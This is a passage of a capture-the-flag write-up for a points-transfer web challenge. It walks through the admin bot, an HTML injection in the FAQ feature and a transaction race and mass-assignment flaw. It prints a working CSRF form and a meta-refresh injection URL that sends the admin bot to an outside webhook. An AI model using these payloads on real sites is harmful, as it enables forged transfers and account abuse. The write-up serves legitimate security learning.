+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">orders</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">locator</span>(<span style="color:#e6db74">&#39;xpath=//table//a&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ordersCount</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">orders</span>.<span style="color:#a6e22e">count</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">formattedDate</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">ordersCount</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> new orders\n`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ordersCount</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">waitForTimeout</span>(<span style="color:#ae81ff">5000</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">orders</span>.<span style="color:#a6e22e">first</span>().<span style="color:#a6e22e">click</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">formattedDate</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> - open order\n`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">waitForSelector</span>(<span style="color:#e6db74">&#39;a[class=&#34;btn btn-success&#34;]&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">problemDescription</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">locator</span>(<span style="color:#e6db74">&#39;xpath=//body//div//p[1]&#39;</span>).<span style="color:#a6e22e">innerText</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">homeOrigin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">url</span>()).<span style="color:#a6e22e">origin</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">problemWords</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">problemDescription</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39; &#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">word</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">problemWords</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urlPattern</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^http:\/\/web:8000\//</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">urlPattern</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">word</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">word</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">homeOrigin</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentProblem</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">url</span>()
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">word</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">waitForTimeout</span>(<span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">currentProblem</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">click</span>(<span style="color:#e6db74">&#39;a[class=&#34;btn btn-success&#34;]&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">formattedDate</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> - delete order\n`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">waitForSelector</span>(<span style="color:#e6db74">&#39;xpath=//h1[text()=&#34;Order Problems List&#34;]&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The part that&rsquo;s most interesting to us is <code>problemWords</code> which if it is a url starting with <code>http://web:8000</code>, the bot nagivates to it. This allows us to make the bot perform any action which is using <code>http://web:8000?action=something</code> and accepts GET parameters.
+<img src="image.png" alt="Report-problem"></p>
+<ol start="3">
+<li><strong>web</strong> is the where the main challenge code resides. Lets take a quick look at a few interesting actions.
+<ul>
+<li>order-problem: This is where the user can submit a message which is added to the list at the order-problems action that the manager performs. So this is where we send our playload to the admin</li>
+<li>faq: Allows the user to send a question which is passed to a faq matching system based on available <code>faq_data</code> and then redirects to an answer in the answer/faq folder.</li>
+<li>transactions-list: Shows list of all transactions with user as sender or receiver</li>
+<li>create-transaction: Allows user to send LP to another user.</li>
+<li>delete-account-and-get-flag: This is the action which we need to call but requires us to have 999999999LP balance.</li>
+</ul>
+</li>
+</ol>
+<h3 id="exploitation">Exploitation</h3>
+<p>Now that we have a general idea of the challenge, I like to work backwards from the solution/flag. We need to call the <code>delete-account-and-get-flag</code> action which only works if we have balance 999999999 and we are not the manager user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;delete-account-and-get-flag&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">999_999_999</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">is_manager</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">is_admin</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">remove</span>()
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">commit</span>()
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;midnight{********REDACTED********}&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span></code></pre></div><p>New users only have 10LP and we need to find a way to increase that. Since the manager user already has 999999999 balance lets look at how we can get the manager to send that to us and for that lets take a closer look at how transactions work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;create-transaction&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">sender</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">recipient_name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;recipient&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">recipient_name</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">recipient_name</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">recipient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">filter_by</span>(<span style="color:#a6e22e">username</span><span style="color:#f92672">=</span><span style="color:#a6e22e">recipient_name</span>).<span style="color:#a6e22e">first</span>()
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">recipient</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">amount</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;amount&#39;</span>))
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">amount</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">form_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dict</span>(<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">form</span>)
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">form_data</span>[<span style="color:#e6db74">&#39;amount&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">amount</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">del</span> <span style="color:#a6e22e">form_data</span>[<span style="color:#e6db74">&#39;recipient&#39;</span>]
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">form_data</span>[<span style="color:#e6db74">&#39;recipient_id&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">recipient</span>.<span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">transaction</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Transaction</span>.<span style="color:#a6e22e">update_or_create</span>(<span style="color:#a6e22e">current_user</span>.<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">form_data</span>)
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">transaction</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;Transaction has been successfully created and will be processed shortly&#39;</span>,
+</span></span><span style="display:flex;"><span>                                          <span style="color:#e6db74">&#39;success&#39;</span>)
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;Invalid amount&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;Recipient not found&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;You can\&#39;t send points to yourself&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">flash</span>(<span style="color:#e6db74">&#39;Enter a recipient name&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/?action=transactions-list&#39;</span>)
+</span></span></code></pre></div><p>It takes the recipient parameter from request.form which is POST only, hence the report page we saw earlier cannot be used to send a transaction by itself as it only does get request. That is the <strong>first issue</strong> we have to solve.</p>
+<p>Looking at the code which updates the balances and performs the transactions, we notice the <strong>second issue</strong> - transaction amounts &gt; 10 will be assigned a status of pending-manual-check and only confirmed transactions will be processed in the <code>send_transaction()</code> function. Another thing to notice here is the fact that the schduler interval for both the functions are 0.1 and 0.13, leaving a small race window which will be useful to us later on.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">scheduler</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">APScheduler</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">confirm_transaction</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">app_context</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pending_transactions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Transaction</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">Transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;pending&#39;</span>).<span style="color:#a6e22e">all</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">transaction</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">pending_transactions</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">amount</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;confirmed&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pending-manual-check&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">commit</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scheduler</span>.<span style="color:#a6e22e">add_job</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;confirm_transaction&#39;</span>, <span style="color:#a6e22e">func</span><span style="color:#f92672">=</span><span style="color:#a6e22e">confirm_transaction</span>, <span style="color:#a6e22e">trigger</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;interval&#34;</span>, <span style="color:#a6e22e">seconds</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">send_transaction</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">app_context</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">confirmed_transactions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Transaction</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">Transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;confirmed&#39;</span>).<span style="color:#a6e22e">all</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">transaction</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">confirmed_transactions</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sender</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">sender_id</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">recipient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">recipient_id</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">sender</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">recipient</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">amount</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sent&#39;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">is_manager</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">amount</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">recipient</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">amount</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">transaction</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rejected&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">commit</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scheduler</span>.<span style="color:#a6e22e">add_job</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;send_transaction&#39;</span>, <span style="color:#a6e22e">func</span><span style="color:#f92672">=</span><span style="color:#a6e22e">send_transaction</span>, <span style="color:#a6e22e">trigger</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;interval&#34;</span>, <span style="color:#a6e22e">seconds</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.13</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scheduler</span>.<span style="color:#a6e22e">start</span>()
+</span></span></code></pre></div><h4 id="first-issue">First issue</h4>
+<p>We need a way to get the manager user to send a POST request to create-transaction action but currently we only have the ability to make the manager send a GET request. So, drilling down on the actions that function using GET request, we land on the faq action. During the CTF I was playing around with it, submitting random questions, the output of which looks like below.
+<img src="image-1.png" alt="faqimg1">
+Just to see how different terms in questions will return answers, I supplied &ldquo;PR&rdquo; which gave a surprising output.
+<img src="image-2.png" alt="faqimg2">
+Using this - <a href="https://hackchan-mjk2mpay.ctf.pro/?action=faq&amp;question=PR%3Ch1%3Etest%3C/h1%3E" target="_blank">https://hackchan-mjk2mpay.ctf.pro/?action=faq&amp;question=PR%3Ch1%3Etest%3C/h1%3E</a> we are able to get HTML injection but not quite XSS. For our case this will suffice as it is possible for us to use the meta tag to redirect to attacker controlled site where a CSRF payload is hosted.</p>
+<p>The reason why this worked is that &ldquo;PR&rdquo; is tagged with the label &ldquo;media&rdquo; and if you look at the answers folder, there is a <code>.intermediaries.html.swp</code> file which contains &lsquo;media&rsquo; in the name. Hence when label &ldquo;in&rdquo; file is checked on the faq answers file list, <code>.intermediaries.html.swp</code> file is used instead of <code>media.html</code> template. Since jinja2 only <a href="https://jinja.palletsprojects.com/en/stable/api/#jinja2.select_autoescape" target="_blank">autoescapes html for file extensions &lsquo;html&rsquo;, &lsquo;htm&rsquo; and &lsquo;xml&rsquo;</a> we get HTML injection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">file</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">listdir</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">label</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/faq/answers/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">context</span>[<span style="color:#e6db74">&#39;question&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">question</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>So at this stage, our exploit looks like the following:</p>
+<ol>
+<li>host the following payload on attacker controlled site/webhook</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cool&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:5000/?action=create-transaction&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recipient&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1234567891&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amount&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">defer</span>&gt;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">form</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;cool&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">submit</span>()
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><ol start="2">
+<li>send the following url as order problem which will be visited by the admin bot</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://web:8000/?action=faq&amp;question=pr%20%3Cmeta%20http-equiv=%22refresh%22%20content=%221;url=http://webhook.site/1f2ca6d7-e5b4-4607-b2f1-26c8b0d9dabe%22%20/%3E
+</span></span></code></pre></div><p><img src="image-3.png" alt="transaction1">
+Checking the transcation list, we can see that we have received 1LP from the manager 🎊.</p>
+<p>Now the problem is that we are not allowed to send more than 10LP and sending 10LP 1000000000 times is just not feasible so onto the next issue.</p>
+<h4 id="second-issue">Second issue</h4>
+<p>Lets take a closer look at the <code>Transaction.update_or_create</code> function in <code>models.py</code> which is responsible for adding the transactions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_or_create</span>(cls, sender_id, data):
+</span></span><span style="display:flex;"><span>    transaction_id <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;transaction_id&#39;</span>)
+</span></span><span style="display:flex;"><span>    data[<span style="color:#e6db74">&#39;sender_id&#39;</span>] <span style="color:#f92672">=</span> sender_id
+</span></span><span style="display:flex;"><span>    data[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pending&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> transaction_id:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> data[<span style="color:#e6db74">&#39;status&#39;</span>]
+</span></span><span style="display:flex;"><span>        existing_transaction <span style="color:#f92672">=</span> cls<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>get(transaction_id)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> existing_transaction:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> existing_transaction<span style="color:#f92672">.</span>sender_id <span style="color:#f92672">==</span> sender_id:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>                    setattr(existing_transaction, key, value)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        new_transaction <span style="color:#f92672">=</span> cls(<span style="color:#f92672">**</span>data)
+</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(new_transaction)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> existing_transaction <span style="color:#66d9ef">if</span> transaction_id <span style="color:#66d9ef">else</span> new_transaction
